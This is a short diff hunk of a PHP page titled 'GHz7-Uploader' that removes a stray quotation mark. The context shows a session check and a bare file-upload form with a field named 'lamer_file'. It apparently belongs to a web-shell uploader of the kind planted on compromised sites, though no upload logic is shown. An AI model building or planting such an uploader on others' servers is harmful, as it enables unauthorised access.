@@ -13,7 +13,7 @@ exit;}if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
 <meta name='theme-color' content=' #000000'>
 <title>GHz7</title>
 </head>
-<body>"
+<body>
 <center><h1>GHz7-Uploader</h1><br>
 <form method='post' enctype='multipart/form-data'>
 <input type='file' name='lamer_file'></input>
